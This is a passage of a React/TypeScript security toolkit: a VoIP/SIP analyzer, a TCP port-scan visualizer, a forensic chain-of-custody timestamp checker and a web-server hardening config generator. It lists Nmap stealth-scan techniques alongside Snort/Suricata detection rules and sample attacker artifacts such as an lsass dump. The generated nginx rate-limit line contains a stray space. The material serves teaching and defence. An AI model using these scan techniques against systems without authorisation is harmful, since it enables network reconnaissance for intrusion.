                {sipAnalysis.isSrtp ? "SRTP (AES_CM_128)" : "Unencrypted RTP/AVP"}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-2.5">
              <div className="text-[10px] text-text-muted">Caller-ID Spoof Check</div>
              <div className={sipAnalysis.callerIdMismatch ? "text-rose-400 font-bold" : "text-emerald-400 font-bold"}>
                {sipAnalysis.callerIdMismatch ? "From != PAI Mismatch!" : "Aligned"}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-2.5">
              <div className="text-[10px] text-text-muted">Scanner User-Agent</div>
              <div className={sipAnalysis.isScannerUa ? "text-rose-400 font-bold" : "text-emerald-400 font-bold"}>
                {sipAnalysis.isScannerUa ? "SIPVicious Detected!" : "Clean"}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Module B: VoIP Bandwidth Calculator */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-3">
        <div className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
          Module B: VoIP Concurrent Call Bandwidth (Mbps) &amp; L2/IP/UDP/RTP Overhead Calculator
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          <div>
            <label className="block font-heading text-[10px] uppercase text-text-muted">
              Audio Codec
            </label>
            <select
              value={codec}
              onChange={(e) => setCodec(e.target.value as "g711" | "g729" | "opus")}
              className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            >
              <option value="g711">G.711 PCMU/PCMA (64 kbps uncompressed)</option>
              <option value="g729">G.729 Annex A (8 kbps compressed)</option>
              <option value="opus">Opus Fullband (32 kbps adaptive)</option>
            </select>
          </div>
          <div>
            <label className="block font-heading text-[10px] uppercase text-text-muted">
              Concurrent Active Calls: {concurrentCalls}
            </label>
            <input
              type="range"
              min={1}
              max={500}
              value={concurrentCalls}
              onChange={(e) => setConcurrentCalls(Number(e.target.value))}
              className="mt-2 w-full accent-[#ff6a00]"
            />
          </div>
          <div>
            <label className="block font-heading text-[10px] uppercase text-text-muted">
              Packetization Interval (ptime)
            </label>
            <select
              value={ptimeMs}
              onChange={(e) => setPtimeMs(Number(e.target.value) as 20 | 30)}
              className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            >
              <option value={20}>20 ms (50 packets/sec — Standard)</option>
              <option value={30}>30 ms (33.3 packets/sec — Lower Overhead)</option>
            </select>
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-1 font-mono-code text-xs">
          <div className="rounded-xs bg-surface p-2.5">
            <span className="text-[10px] text-text-muted block">Wire Rate Per Leg (incl. 58B headers)</span>
            <span className="font-bold text-text">{voipBw.perCallKbps} kbps</span>
          </div>
          <div className="rounded-xs bg-surface p-2.5">
            <span className="text-[10px] text-text-muted block">Bidirectional Trunk Bandwidth</span>
            <span className="font-bold text-accent">{voipBw.totalMbpsBidirectional} Mbps</span>
          </div>
          <div className="rounded-xs bg-surface p-2.5">
            <span className="text-[10px] text-text-muted block">Total Router Packet Rate (PPS)</span>
            <span className="font-bold text-emerald-400">{voipBw.totalPpsBidirectional.toLocaleString()} pps</span>
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 8. TCP FLAG & PORT SCANNER HANDSHAKE STATE MACHINE VISUALIZER
 *    Slug: tcp-flag-port-scan-handshake-visualizer
 * ========================================================================== */
type ScanTypeKey = "syn" | "connect" | "fin" | "xmas" | "null" | "ack" | "udp";
type TargetPortStateKey = "open" | "closed" | "filtered_drop" | "filtered_acl";

function TcpFlagPortScanHandshakeVisualizer({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [scanType, setScanType] = useState<ScanTypeKey>("syn");
  const [portState, setPortState] = useState<TargetPortStateKey>("open");

  useEffect(() => {
    setScanType("syn");
    setPortState("open");
  }, [resetTrigger]);

  const simulation = useMemo(() => {
    const flags = { URG: 0, ACK: 0, PSH: 0, RST: 0, SYN: 0, FIN: 0 };
    let hexByte = "0x02";
    let nmapFlag = "-sS";
    let snortRule = "";

    if (scanType === "syn" || scanType === "connect") {
      flags.SYN = 1;
      hexByte = "0x02";
      nmapFlag = scanType === "syn" ? "-sS (Half-Open SYN)" : "-sT (Full Connect)";
      snortRule = `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN Nmap TCP SYN Scan"; flags:S; threshold:type both, track by_src, count 20, seconds 5; sid:1000401;)`;
    } else if (scanType === "fin") {
      flags.FIN = 1;
      hexByte = "0x01";
      nmapFlag = "-sF (FIN Stealth)";
      snortRule = `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN Nmap FIN Scan"; flags:F; sid:1000402;)`;
    } else if (scanType === "xmas") {
      flags.FIN = 1;
      flags.PSH = 1;
      flags.URG = 1;
      hexByte = "0x29";
      nmapFlag = "-sX (Xmas Tree FIN+PSH+URG)";
      snortRule = `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN Nmap Xmas Scan FIN+PSH+URG"; flags:FPU; sid:1000403;)`;
    } else if (scanType === "null") {
      hexByte = "0x00";
      nmapFlag = "-sN (Null Zero-Flags)";
      snortRule = `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN Nmap Null Scan"; flags:0; sid:1000404;)`;
    } else if (scanType === "ack") {
      flags.ACK = 1;
      hexByte = "0x10";
      nmapFlag = "-sA (ACK Firewall Ruleset Probe)";
      snortRule = `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN Nmap Stateful Firewall ACK Probe"; flags:A; flow:stateless; sid:1000405;)`;
    } else {
      hexByte = "UDP (No TCP Flags)";
      nmapFlag = "-sU (UDP Payload Probe)";
      snortRule = `alert icmp $HOME_NET any -> $EXTERNAL_NET any (msg:"SCAN UDP Port Unreachable Sweep"; itype:3; icode:3; sid:1000406;)`;
    }

    const packets: { dir: "-> " | "<- "; label: string; color: string }[] = [];
    let inferredState = "";
    let rfcExplanation = "";

    if (portState === "filtered_drop") {
      packets.push({ dir: "-> ", label: `Probe #1 (${nmapFlag})`, color: "#ff6a00" });
      packets.push({ dir: "-> ", label: `Retransmission Timeout (No Reply)`, color: "#fbbf24" });
      inferredState = "filtered";
      rfcExplanation = "Stateful firewall silently dropped the probe packet; Nmap marks port as 'filtered' after retransmission timeout.";
    } else if (portState === "filtered_acl") {
      packets.push({ dir: "-> ", label: `Probe (${nmapFlag})`, color: "#ff6a00" });
      packets.push({ dir: "<- ", label: `ICMP Type 3 Code 13 (Admin Prohibited)`, color: "#fb7185" });
      inferredState = "filtered";
      rfcExplanation = "Stateless router ACL rejected the packet with ICMP Destination Unreachable (Communication Administratively Prohibited).";
    } else if (scanType === "syn") {
      packets.push({ dir: "-> ", label: "SYN (Seq=0, Flags=0x02)", color: "#ff6a00" });
      if (portState === "open") {
        packets.push({ dir: "<- ", label: "SYN + ACK (Seq=0, Ack=1, Flags=0x12)", color: "#34d399" });
        packets.push({ dir: "-> ", label: "RST (Tears down before full accept(), Flags=0x04)", color: "#38bdf8" });
        inferredState = "open";
        rfcExplanation = "Target listening socket replied SYN/ACK; scanner immediately sends RST to avoid completing 3-way handshake.";
      } else {
        packets.push({ dir: "<- ", label: "RST + ACK (Flags=0x14)", color: "#fb7185" });
        inferredState = "closed";
        rfcExplanation = "Target OS kernel immediately replied RST/ACK because no process is bound to the port.";
      }
    } else if (scanType === "connect") {
      packets.push({ dir: "-> ", label: "SYN (Flags=0x02)", color: "#ff6a00" });
      if (portState === "open") {
        packets.push({ dir: "<- ", label: "SYN + ACK (Flags=0x12)", color: "#34d399" });
        packets.push({ dir: "-> ", label: "ACK (Handshake Completed, Flags=0x10)", color: "#38bdf8" });
        packets.push({ dir: "-> ", label: "RST + ACK (Close Socket)", color: "#94a3b8" });
        inferredState = "open";
        rfcExplanation = "OS connect() syscall completed full 3-way handshake; logged by application accept() layer.";
      } else {
        packets.push({ dir: "<- ", label: "RST + ACK (Flags=0x14)", color: "#fb7185" });
        inferredState = "closed";
        rfcExplanation = "Immediate RST/ACK response indicates port is closed.";
      }
    } else if (scanType === "fin" || scanType === "xmas" || scanType === "null") {
      packets.push({ dir: "-> ", label: `Out-of-State Probe (${hexByte})`, color: "#ff6a00" });
      if (portState === "open") {
        packets.push({ dir: "<- ", label: "(Silence — RFC 793 Drops Non-SYN/RST on Open Port)", color: "#34d399" });
        inferredState = "open|filtered";
        rfcExplanation = "Per RFC 793, an OPEN port silently ignores segments lacking SYN, ACK, or RST bits.";
      } else {
        packets.push({ dir: "<- ", label: "RST + ACK (Flags=0x14)", color: "#fb7185" });
        inferredState = "closed";
        rfcExplanation = "Per RFC 793, a CLOSED port responds with a RST to any out-of-state segment not containing RST.";
      }
    } else if (scanType === "ack") {
      packets.push({ dir: "-> ", label: "Unsolicited ACK (Flags=0x10)", color: "#ff6a00" });
      packets.push({ dir: "<- ", label: "RST (Flags=0x04 — Both Open & Closed reply RST!)", color: "#38bdf8" });
      inferredState = "unfiltered";
      rfcExplanation = "ACK scan (-sA) cannot distinguish open vs closed, but receipt of RST proves no stateful firewall blocked the port ('unfiltered').";
    } else {
      packets.push({ dir: "-> ", label: "UDP Datagram Probe", color: "#ff6a00" });
      if (portState === "open") {
        packets.push({ dir: "<- ", label: "UDP App Response (or Silence)", color: "#34d399" });
        inferredState = "open|filtered";
        rfcExplanation = "No ICMP Port Unreachable returned; port is either open or packet was dropped.";
      } else {
        packets.push({ dir: "<- ", label: "ICMP Type 3 Code 3 (Port Unreachable)", color: "#fb7185" });
        inferredState = "closed";
        rfcExplanation = "Host kernel returned ICMP Port Unreachable, proving the UDP port is closed.";
      }
    }

    return { flags, hexByte, nmapFlag, packets, inferredState, rfcExplanation, snortRule };
  }, [scanType, portState]);

  useEffect(() => {
    setOutput(
      [
        `=== TCP FLAG & NMAP PORT SCAN STATE MACHINE ===`,
        `Scan Mode: ${simulation.nmapFlag}`,
        `Probe Flag Byte: ${simulation.hexByte} | URG=${simulation.flags.URG} ACK=${simulation.flags.ACK} PSH=${simulation.flags.PSH} RST=${simulation.flags.RST} SYN=${simulation.flags.SYN} FIN=${simulation.flags.FIN}`,
        `Target Port Condition: ${portState.toUpperCase()}`,
        `Nmap Inferred State: ${simulation.inferredState.toUpperCase()}`,
        `RFC 793 / 1122 Logic: ${simulation.rfcExplanation}`,
        ``,
        `Packet Sequence:`,
        ...simulation.packets.map((p, i) => `  ${i + 1}. Attacker ${p.dir} Target : ${p.label}`),
        ``,
        `Snort / Suricata Detection Rule:`,
        simulation.snortRule,
      ].join("\n")
    );
  }, [simulation, portState, setOutput]);

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 rounded-xs border border-border bg-background p-3.5">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Select Nmap Scan Technique
          </label>
          <select
            value={scanType}
            onChange={(e) => setScanType(e.target.value as ScanTypeKey)}
            className="mt-1.5 w-full rounded-xs border border-border bg-surface px-2.5 py-2 font-mono-code text-xs text-text"
          >
            <option value="syn">TCP SYN Stealth Scan (-sS)</option>
            <option value="connect">TCP Full Connect Scan (-sT)</option>
            <option value="fin">TCP FIN Scan (-sF)</option>
            <option value="xmas">TCP Xmas Tree Scan (-sX: FIN+PSH+URG)</option>
            <option value="null">TCP Null Scan (-sN: 0x00 Flags)</option>
            <option value="ack">TCP ACK Firewall Probe (-sA)</option>
            <option value="udp">UDP Port Scan (-sU)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Select Target Port / Firewall State
          </label>
          <select
            value={portState}
            onChange={(e) => setPortState(e.target.value as TargetPortStateKey)}
            className="mt-1.5 w-full rounded-xs border border-border bg-surface px-2.5 py-2 font-mono-code text-xs text-text"
          >
            <option value="open">Open (Service Listening on Port)</option>
            <option value="closed">Closed (No Socket Bound)</option>
            <option value="filtered_drop">Filtered by Stateful Firewall (Silent Drop)</option>
            <option value="filtered_acl">Filtered by Stateless Router ACL (ICMP Type 3 Code 13)</option>
          </select>
        </div>
      </div>

      {/* 6-Bit TCP Flag Header Register */}
      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="flex items-center justify-between mb-2">
          <span className="font-heading text-xs font-bold uppercase text-accent">
            6-Bit TCP Header Control Flags ({simulation.hexByte})
          </span>
          <span className="font-mono-code text-xs text-text">
            Nmap Verdict: <strong className="text-emerald-400">{simulation.inferredState}</strong>
          </span>
        </div>
        <div className="grid grid-cols-6 gap-2 font-mono-code text-center text-xs">
          {(["URG", "ACK", "PSH", "RST", "SYN", "FIN"] as const).map((bit) => {
            const on = simulation.flags[bit] === 1;
            return (
              <div
                key={bit}
                className={`rounded-xs border py-2 ${
                  on
                    ? "border-[#ff6a00] bg-[#ff6a00]/15 text-[#ff6a00] font-bold"
                    : "border-border bg-surface text-text-muted"
                }`}
              >
                <div>{bit}</div>
                <div className="text-sm">{on ? "1" : "0"}</div>
              </div>
            );
          })}
        </div>
      </div>

      {/* SVG Packet Exchange Sequence Diagram */}
      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="font-heading text-xs font-bold uppercase text-text mb-2">
          Packet Sequence Exchange Diagram
        </div>
        <svg viewBox="0 0 560 155" className="w-full h-40 bg-surface rounded-xs border border-border/60">
          <text x="45" y="22" fill="#e2e8f0" fontSize="11" fontWeight="bold" fontFamily="monospace">
            ATTACKER (Nmap)
          </text>
          <text x="415" y="22" fill="#e2e8f0" fontSize="11" fontWeight="bold" fontFamily="monospace">
            TARGET PORT 443
          </text>
          <line x1="90" y1="30" x2="90" y2="145" stroke="#475569" strokeWidth="2" />
          <line x1="465" y1="30" x2="465" y2="145" stroke="#475569" strokeWidth="2" />

          {simulation.packets.map((pkt, idx) => {
            const y = 50 + idx * 30;
            const isForward = pkt.dir === "-> ";
            return (
              <g key={idx}>
                <line
                  x1={isForward ? 95 : 460}
                  y1={y}
                  x2={isForward ? 460 : 95}
                  y2={y + 8}
                  stroke={pkt.color}
                  strokeWidth="2"
                />
                <polygon
                  points={
                    isForward
                      ? `460,${y + 8} 451,${y + 4} 452,${y + 12}`
                      : `95,${y + 8} 104,${y + 4} 103,${y + 12}`
                  }
                  fill={pkt.color}
                />
                <text x="135" y={y - 3} fill={pkt.color} fontSize="10" fontFamily="monospace">
                  {pkt.label}
                </text>
              </g>
            );
          })}
        </svg>
        <p className="mt-2 text-xs text-text-muted">{simulation.rfcExplanation}</p>
      </div>

      {/* Snort Rule */}
      <div className="rounded-xs border border-border bg-background p-3">
        <div className="flex items-center justify-between mb-1">
          <span className="font-heading text-[11px] font-bold uppercase text-accent">
            Snort / Suricata IDS Detection Signature
          </span>
          <InlineCopyButton text={simulation.snortRule} />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-2 font-mono-code text-xs text-text">
          {simulation.snortRule}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 9. DIGITAL FORENSICS CHAIN OF CUSTODY & MACB TIMELINE BUILDER
 *    Slug: digital-forensics-chain-of-custody-timeline-builder
 * ========================================================================== */
interface ForensicEvidenceItem {
  id: string;
  fileName: string;
  sizeBytes: number;
  sha256: string;
  sha1: string;
  modifiedIso: string;
  accessedIso: string;
  createdIso: string;
  birthIso: string;
}

const SAMPLE_FORENSIC_ITEMS: ForensicEvidenceItem[] = [
  {
    id: "EV-01",
    fileName: "C:\\Windows\\System32\\svchost_updater.exe",
    sizeBytes: 294912,
    sha256: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    sha1: "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
    modifiedIso: "2022-01-15T08:00:00.000Z", // Timestomped prior to birth!
    accessedIso: "2026-09-28T03:14:00.000Z",
    createdIso: "2026-09-28T03:11:42.419Z",
    birthIso: "2026-09-28T03:11:42.419Z",
  },
  {
    id: "EV-02",
    fileName: "C:\\Users\\admin\\AppData\\Local\\Temp\\dump_lsass.dmp",
    sizeBytes: 44182528,
    sha256: "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
    sha1: "e38ad214943daad1d64c102faec29de4afe9da3d",
    modifiedIso: "2026-09-28T03:15:19.882Z",
    accessedIso: "2026-09-28T03:15:22.104Z",
    createdIso: "2026-09-28T03:15:18.012Z",
    birthIso: "2026-09-28T03:15:18.012Z",
  },
];

function DigitalForensicsChainOfCustodyTimelineBuilder({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [caseId, setCaseId] = useState("DFIR-2026-0928-INC04");
  const [examiner, setExaminer] = useState("Lead DFIR Examiner #402");
  const [bagTag, setBagTag] = useState("SEAL-BAG-88412-A");
  const [acquisitionNotes, setAcquisitionNotes] = useState(
    "Acquired via hardware write-blocker (Tableau T8u) + Velociraptor live triage collection."
  );
  const [items, setItems] = useState<ForensicEvidenceItem[]>(SAMPLE_FORENSIC_ITEMS);

  useEffect(() => {
    setCaseId("DFIR-2026-0928-INC04");
    setExaminer("Lead DFIR Examiner #402");
    setBagTag("SEAL-BAG-88412-A");
    setItems(SAMPLE_FORENSIC_ITEMS);
  }, [resetTrigger]);

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;

    const newEntries: ForensicEvidenceItem[] = [];
    for (let i = 0; i < files.length; i++) {
      const f = files[i];
      const buf = await f.arrayBuffer();
      const sha256Buf = await window.crypto.subtle.digest("SHA-256", buf);
      const sha1Buf = await window.crypto.subtle.digest("SHA-1", buf);

      const toHex = (b: ArrayBuffer) =>
        Array.from(new Uint8Array(b))
          .map((x) => x.toString(16).padStart(2, "0"))
          .join("");

      const mtime = new Date(f.lastModified || Date.now()).toISOString();
      newEntries.push({
        id: `EV-0${items.length + i + 1}`,
        fileName: f.name,
        sizeBytes: f.size,
        sha256: toHex(sha256Buf),
        sha1: toHex(sha1Buf),
        modifiedIso: mtime,
        accessedIso: mtime,
        createdIso: mtime,
        birthIso: mtime,
      });
    }
    setItems((prev) => [...prev, ...newEntries]);
  };

  const evaluateTimestomp = (item: ForensicEvidenceItem) => {
    const m = Date.parse(item.modifiedIso);
    const b = Date.parse(item.birthIso);
    const zeroSubsec = item.modifiedIso.endsWith(":00.000Z");
    const predatesBirth = m < b;
    return {
      isTimestomped: predatesBirth || zeroSubsec,
      reason: predatesBirth
        ? "$SI Modified timestamp predates $FN Birth timestamp (Classic SetFileTime Timestomping)"
        : zeroSubsec
        ? "Zeroed millisecond/nanosecond precision (.000Z) indicates synthetic timestamp modification"
        : "Consistent NTFS MACB chronology",
    };
  };

  const manifestText = useMemo(() => {
    return [
      `====================================================================`,
      `ISO/IEC 27037 & NIST SP 800-86 DIGITAL EVIDENCE CHAIN OF CUSTODY`,
      `====================================================================`,
      `Case Identifier   : ${caseId}`,
      `Lead DFIR Examiner: ${examiner}`,
      `Tamper Seal Tag   : ${bagTag}`,
      `Acquisition Notes : ${acquisitionNotes}`,
      `Generated At (UTC): 2026-09-28T04:34:00Z`,
      ``,
      ...items.map((it) => {
        const ts = evaluateTimestomp(it);
        return [
          `--------------------------------------------------------------------`,
          `[${it.id}] Artifact: ${it.fileName} (${it.sizeBytes.toLocaleString()} bytes)`,
          `  SHA-256 : ${it.sha256}`,
          `  SHA-1   : ${it.sha1}`,
          `  MACB    : M=${it.modifiedIso} | A=${it.accessedIso} | B=${it.birthIso}`,
          `  Forensic Integrity: ${ts.isTimestomped ? `[ALERT: TIMESTOMPING] ${ts.reason}` : "VERIFIED CLEAN"}`,
        ].join("\n");
      }),
    ].join("\n");
  }, [caseId, examiner, bagTag, acquisitionNotes, items]);

  useEffect(() => {
    setOutput(manifestText);
  }, [manifestText, setOutput]);

  return (
    <div className="space-y-4">
      {/* Metadata Inputs */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3 rounded-xs border border-border bg-background p-3.5">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Case ID
          </label>
          <input
            type="text"
            value={caseId}
            onChange={(e) => setCaseId(e.target.value)}
            className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Examiner Name / Badge
          </label>
          <input
            type="text"
            value={examiner}
            onChange={(e) => setExaminer(e.target.value)}
            className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Evidence Bag Tag #
          </label>
          <input
            type="text"
            value={bagTag}
            onChange={(e) => setBagTag(e.target.value)}
            className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      {/* Local In-Browser Hash Dropzone */}
      <div className="flex flex-wrap items-center justify-between gap-3 rounded-xs border border-dashed border-accent/60 bg-background p-3.5">
        <div className="flex items-center gap-2.5">
          <Upload className="h-5 w-5 text-accent" />
          <div>
            <div className="font-heading text-xs font-bold uppercase text-text">
              Hash Local Evidence Files in RAM (`window.crypto.subtle` SHA-256 + SHA-1)
            </div>
            <div className="text-[11px] text-text-muted">
              Zero bytes leave your device. Select any file to append its cryptographic hash to the Chain of Custody.
            </div>
          </div>
        </div>
        <label className="inline-flex items-center gap-1.5 rounded-xs bg-[#ff6a00] px-3.5 py-2 font-heading text-xs font-bold uppercase text-white hover:opacity-90 cursor-pointer">
          <FileCheck className="h-3.5 w-3.5" />
          Add Evidence File(s)
          <input type="file" multiple onChange={handleFileUpload} className="hidden" />
        </label>
      </div>

      {/* Evidence Table */}
      <div className="space-y-2.5">
        {items.map((item) => {
          const ts = evaluateTimestomp(item);
          return (
            <div key={item.id} className="rounded-xs border border-border bg-background p-3.5 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="font-mono-code text-xs font-bold text-text">
                  [{item.id}] {item.fileName}{" "}
                  <span className="text-text-muted font-normal">
                    ({item.sizeBytes.toLocaleString()} B)
                  </span>
                </div>
                <span
                  className={`rounded-xs px-2 py-0.5 font-mono-code text-[10px] font-bold ${
                    ts.isTimestomped
                      ? "bg-rose-500/20 text-rose-400"
                      : "bg-emerald-500/20 text-emerald-400"
                  }`}
                >
                  {ts.isTimestomped ? "NTFS TIMESTOMP ANOMALY" : "MACB CHRONOLOGY VALID"}
                </span>
              </div>
              <div className="font-mono-code text-[11px] text-text-muted space-y-0.5 break-all">
                <div>
                  <strong className="text-text">SHA-256:</strong> {item.sha256}
                </div>
                <div>
                  <strong className="text-text">SHA-1:</strong> {item.sha1}
                </div>
                <div>
                  <strong className="text-text">Modified (M):</strong> {item.modifiedIso} |{" "}
                  <strong className="text-text">Birth (B):</strong> {item.birthIso}
                </div>
              </div>
              <div className="text-[11px] text-amber-300">{ts.reason}</div>
            </div>
          );
        })}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 10. NGINX, APACHE & CADDY HARDENED WEB SERVER CONFIG GENERATOR
 *     Slug: nginx-apache-caddy-config-generator
 * ========================================================================== */
function NginxApacheCaddyConfigGenerator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [domain, setDomain] = useState("app.example.com");
  const [arch, setArch] = useState<"proxy" | "spa" | "wordpress">("proxy");
  const [upstreamPort, setUpstreamPort] = useState("3000");
  const [http3, setHttp3] = useState(true);
  const [websocket, setWebsocket] = useState(true);
  const [hsts, setHsts] = useState(true);
  const [compression, setCompression] = useState(true);
  const [rateLimit, setRateLimit] = useState(true);
  const [blockDotfiles, setBlockDotfiles] = useState(true);
  const [serverTab, setServerTab] = useState<"nginx" | "apache" | "caddy">("nginx");

  useEffect(() => {
    setDomain("app.example.com");
    setArch("proxy");
    setUpstreamPort("3000");
    setHttp3(true);
    setWebsocket(true);
    setHsts(true);
    setCompression(true);
    setRateLimit(true);
    setBlockDotfiles(true);
    setServerTab("nginx");
  }, [resetTrigger]);

  const configs = useMemo(() => {
    const nginx = [
      rateLimit ? `limit_req_zone $binary_remote_addr zone= edge_limit:10m rate=20r/s;\n` : "",
      `server {`,
      `    listen 443 ssl http2;`,
      http3 ? `    listen 443 quic reuseport;\n    add_header Alt-Svc 'h3=":443"; ma=86400' always;` : "",
      `    server_name ${domain};`,
      `    server_tokens off;`,
      ``,
      `    ssl_protocols TLSv1.2 TLSv1.3;`,
      hsts
        ? `    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`
        : "",
      `    add_header X-Content-Type-Options "nosniff" always;`,
      `    add_header X-Frame-Options "SAMEORIGIN" always;`,
      compression ? `    gzip on;\n    gzip_types text/plain text/css application/json application/javascript;` : "",
      blockDotfiles
        ? `\n    location ~ /\\.(?!well-known) {\n        deny all;\n        return 404;\n    }`
        : "",
      ``,
      arch === "proxy"
        ? [
            `    location / {`,
            rateLimit ? `        limit_req zone=edge_limit burst=40 nodelay;` : "",
            `        proxy_pass http://127.0.0.1:${upstreamPort};`,
            `        proxy_http_version 1.1;`,
            websocket
              ? `        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection "upgrade";`
              : "",
            `        proxy_set_header Host $host;`,
            `        proxy_set_header X-Real-IP $remote_addr;`,
            `        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`,
            `        proxy_set_header X-Forwarded-Proto $scheme;`,
            `    }`,
          ]
            .filter(Boolean)
            .join("\n")
        : arch === "spa"
        ? `    root /var/www/${domain}/dist;\n    index index.html;\n    location / {\n        try_files $uri $uri/ /index.html;\n    }`
        : `    root /var/www/${domain}/public;\n    index index.php;\n    location ~ \\.php$ {\n        include fastcgi_params;\n        fastcgi_pass unix:/run/php/php8.3-fpm.sock;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    }`,
      `}`,
    ]
      .filter(Boolean)
      .join("\n");

    const apache = [
      `<VirtualHost *:443>`,
      `    ServerName ${domain}`,
      `    SSLEngine on`,
      `    SSLProtocol -all +TLSv1.2 +TLSv1.3`,
      hsts
        ? `    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"`
        : "",
      `    Header always set X-Content-Type-Options "nosniff"`,
      blockDotfiles
        ? `    <DirectoryMatch "^\\.|\\/\\.(?!well-known)">\n        Require all denied\n    </DirectoryMatch>`
        : "",
      arch === "proxy"
        ? [
            `    ProxyPreserveHost On`,
            websocket
              ? `    RewriteEngine On\n    RewriteCond %{HTTP:Upgrade} websocket [NC]\n    RewriteRule /(.*) ws://127.0.0.1:${upstreamPort}/$1 [P,L]`
              : "",
            `    ProxyPass / http://127.0.0.1:${upstreamPort}/`,
            `    ProxyPassReverse / http://127.0.0.1:${upstreamPort}/`,
          ]
            .filter(Boolean)
            .join("\n")
        : `    DocumentRoot /var/www/${domain}/public\n    FallbackResource /index.html`,
      `</VirtualHost>`,
    ]
      .filter(Boolean)
      .join("\n");

    const caddy = [
      `${domain} {`,
      compression ? `    encode zstd gzip` : "",
      `    header {`,
      hsts ? `        Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"` : "",
      `        X-Content-Type-Options "nosniff"`,
      `        X-Frame-Options "SAMEORIGIN"`,
      `        -Server`,
      `    }`,
      blockDotfiles ? `    @dotfiles path *.env *.git* */\n    respond @dotfiles 404` : "",
      arch === "proxy"
        ? `    reverse_proxy 127.0.0.1:${upstreamPort}`
        : arch === "spa"
        ? `    root * /var/www/${domain}/dist\n    try_files {path} /index.html\n    file_server`
        : `    root * /var/www/${domain}/public\n    php_fastcgi unix//run/php/php8.3-fpm.sock\n    file_server`,
      `}`,
    ]
      .filter(Boolean)
      .join("\n");

    return { nginx, apache, caddy };
  }, [domain, arch, upstreamPort, http3, websocket, hsts, compression, rateLimit, blockDotfiles]);

  useEffect(() => {
    setOutput(
      [
        `# === NGINX CONFIGURATION (nginx.conf) ===`,
        configs.nginx,
        ``,
        `# === APACHE VIRTUALHOST (httpd-vhosts.conf) ===`,
        configs.apache,
        ``,
        `# === CADDY V2 CONFIGURATION (Caddyfile) ===`,
        configs.caddy,
      ].join("\n")
    );
  }, [configs, setOutput]);

  const activeCode =
    serverTab === "nginx" ? configs.nginx : serverTab === "apache" ? configs.apache : configs.caddy;

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3 rounded-xs border border-border bg-background p-3.5">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Domain Name
          </label>
          <input
            type="text"
            value={domain}
            onChange={(e) => setDomain(e.target.value)}
            className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Architecture Pattern
          </label>
          <select
            value={arch}
            onChange={(e) => setArch(e.target.value as "proxy" | "spa" | "wordpress")}
            className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value="proxy">Node.js / Next.js Reverse Proxy</option>
            <option value="spa">Static SPA with History Fallback</option>
            <option value="wordpress">PHP-FPM 8.3 WordPress</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Upstream Port
          </label>
          <input
            type="text"
            value={upstreamPort}
            onChange={(e) => setUpstreamPort(e.target.value)}
            className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      {/* Security & Performance Toggles */}
